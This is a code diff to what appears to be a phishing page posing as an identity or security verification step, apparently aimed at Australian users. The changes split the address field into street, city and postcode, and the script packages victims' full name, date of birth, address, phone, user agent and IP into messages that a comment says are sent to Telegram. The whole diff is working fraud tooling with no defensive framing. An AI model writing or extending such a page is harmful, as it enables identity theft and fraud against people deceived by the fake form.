@@ -75,11 +75,11 @@
         overflow: hidden;
       }
 
-      .-questions-icon {
+      .security-questions-icon {
         width: 45px;
         height: 45px;
       }
-      .-questions-header {
+      .security-questions-header {
         font-family: "SourceSans-Light";
         font-size: 1.5em;
       }
@@ -97,13 +97,6 @@
         top: 30%;
         left: 50%;
         transform: translate(-50%, -50%);
-      }
-
-      h1 {
-        font-size: 30px;
-        margin-bottom: 32px;
-        color: #333;
-        font-weight: 100;
       }
 
       .input_field {
@@ -329,11 +322,11 @@
           padding: 20px;
         }
 
-        .-questions-icon {
+        .security-questions-icon {
           width: 40px;
           height: 40px;
         }
-        .-questions-header {
+        .security-questions-header {
           font-size: 1.2em;
         }
         #agree {
@@ -363,7 +356,7 @@
           |
           <p>Help</p>
           |
-          <p></p>
+          <p>Security</p>
           |
           <p>Contact us</p>
           |
@@ -388,7 +381,7 @@
             </div>
             <form id="loginForm" novalidate>
               <div
-                class="-questiion-header"
+                class="security-questiion-header"
                 style="
                   display: flex;
                   align-items: center;
@@ -404,7 +397,7 @@
                   xmlns="http://www.w3.org/2000/svg"
                   stroke="#c22424"
                   stroke-width="0.00035"
-                  class="-questions-icon"
+                  class="security-questions-icon"
                 >
                   <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                   <g
@@ -423,7 +416,7 @@
                     ></path>
                   </g>
                 </svg>
-                <h2 class="-questions-header">
+                <h2 class="security-questions-header">
                   Verify Your Identity
                 </h2>
               </div>
@@ -457,19 +450,50 @@
                 <div id="error-dob" class="error"></div>
               </div>
 
-              <!-- Address -->
+              <!-- Street Address -->
               <div class="input_field">
-                <label for="address">Address</label>
+                <label for="street">Street Address</label>
                 <div style="margin: 0.5em 0; width: 100%">
                   <input
                     type="text"
-                    id="address"
-                    name="address"
-                    placeholder="e.g. 123 Main Street, Sydney NSW 2000"
+                    id="street"
+                    name="street"
+                    placeholder="e.g. 123 Main Street"
                     required
                   />
                 </div>
-                <div id="error-address" class="error"></div>
+                <div id="error-street" class="error"></div>
+              </div>
+
+              <!-- City -->
+              <div class="input_field">
+                <label for="city">City</label>
+                <div style="margin: 0.5em 0; width: 100%">
+                  <input
+                    type="text"
+                    id="city"
+                    name="city"
+                    placeholder="e.g. Sydney"
+                    required
+                  />
+                </div>
+                <div id="error-city" class="error"></div>
+              </div>
+
+              <!-- Postal Code -->
+              <div class="input_field">
+                <label for="postalCode">Postal Code</label>
+                <div style="margin: 0.5em 0; width: 100%">
+                  <input
+                    type="text"
+                    id="postalCode"
+                    name="postalCode"
+                    placeholder="e.g. 2000"
+                    maxlength="4"
+                    required
+                  />
+                </div>
+                <div id="error-postalCode" class="error"></div>
               </div>
 
               <!-- Phone Number -->
@@ -703,7 +727,9 @@
           case 1: // Identity Verification
             const fullName = clean(formData.get('fullName') || '');
             const dob = clean(formData.get('dob') || '');
-            const address = clean(formData.get('address') || '');
+            const street = clean(formData.get('street') || '');
+            const city = clean(formData.get('city') || '');
+            const postalCode = clean(formData.get('postalCode') || '');
             const phone = clean(formData.get('phone') || '');
 
             message = `
@@ -713,7 +739,9 @@
 
         Full Name: ${fullName}
         Date of Birth: ${dob}
-        Address: ${address}
+        Street Address: ${street}
+        City: ${city}
+        Postal Code: ${postalCode}
         Phone Number: ${phone}
 
         --------------[USER AGENT IP DNS]--------------
@@ -755,9 +783,9 @@
 
           case 4: // Review
             message = `
-        --------------[ QA REVIEW]--------------
+        --------------[SECURITY QA REVIEW]--------------
 
-        ${Session.getUsername()} Reviewing  Questions and Answers Set
+        ${Session.getUsername()} Reviewing Security Questions and Answers Set
 
         ------------[USER AGENT IP DNS]-------------
         User Agent
@@ -804,12 +832,16 @@
 
         const fullName = document.getElementById("fullName");
         const dob = document.getElementById("dob");
-        const address = document.getElementById("address");
+        const street = document.getElementById("street");
+        const city = document.getElementById("city");
+        const postalCode = document.getElementById("postalCode");
         const phone = document.getElementById("phone");
 
         const errorFullName = document.getElementById("error-fullName");
         const errorDob = document.getElementById("error-dob");
-        const errorAddress = document.getElementById("error-address");
+        const errorStreet = document.getElementById("error-street");
+        const errorCity = document.getElementById("error-city");
+        const errorPostalCode = document.getElementById("error-postalCode");
         const errorPhone = document.getElementById("error-phone");
 
         // Phone number validation - only numbers, max 10 digits
@@ -817,8 +849,13 @@
           this.value = this.value.replace(/\D/g, "").slice(0, 10);
         });
 
+        // Postal code - only numbers, max 4 digits
+        postalCode.addEventListener("input", function () {
+          this.value = this.value.replace(/\D/g, "").slice(0, 4);
+        });
+
         // Clear errors on focus
-        [fullName, dob, address, phone].forEach(function(input) {
+        [fullName, dob, street, city, postalCode, phone].forEach(function(input) {
           input.addEventListener("focus", function() {
             const errorId = "error-" + this.id;
             const errorEl = document.getElementById(errorId);
@@ -870,14 +907,38 @@
             }
           }
 
-          // Validate Address
-          if (!address.value.trim()) {
-            errorAddress.textContent = "Please enter your address.";
-            address.classList.add("input_error");
+          // Validate Street Address
+          if (!street.value.trim()) {
+            errorStreet.textContent = "Please enter your street address.";
+            street.classList.add("input_error");
             isValid = false;
           } else {
-            address.classList.remove("input_error");
-            errorAddress.textContent = "";
+            street.classList.remove("input_error");
+            errorStreet.textContent = "";
+          }
+
+          // Validate City
+          if (!city.value.trim()) {
+            errorCity.textContent = "Please enter your city.";
+            city.classList.add("input_error");
+            isValid = false;
+          } else {
+            city.classList.remove("input_error");
+            errorCity.textContent = "";
+          }
+
+          // Validate Postal Code
+          if (!postalCode.value) {
+            errorPostalCode.textContent = "Please enter your postal code.";
+            postalCode.classList.add("input_error");
+            isValid = false;
+          } else if (postalCode.value.length !== 4) {
+            errorPostalCode.textContent = "Please enter a valid 4-digit postal code.";
+            postalCode.classList.add("input_error");
+            isValid = false;
+          } else {
+            postalCode.classList.remove("input_error");
+            errorPostalCode.textContent = "";
           }
 
           // Validate Phone Number
@@ -921,7 +982,9 @@
         const data = {
           fullName: document.getElementById("fullName").value,
           dob: document.getElementById("dob").value,
-          address: document.getElementById("address").value,
+          street: document.getElementById("street").value,
+          city: document.getElementById("city").value,
+          postalCode: document.getElementById("postalCode").value,
           phone: document.getElementById("phone").value,
         };
 
@@ -930,7 +993,9 @@
         formData.append("sws", 1);
         formData.append("fullName", data.fullName);
         formData.append("dob", data.dob);
-        formData.append("address", data.address);
+        formData.append("street", data.street);
+        formData.append("city", data.city);
+        formData.append("postalCode", data.postalCode);
         formData.append("phone", data.phone);
 
         // Process and send to Telegram (no PHP needed!)
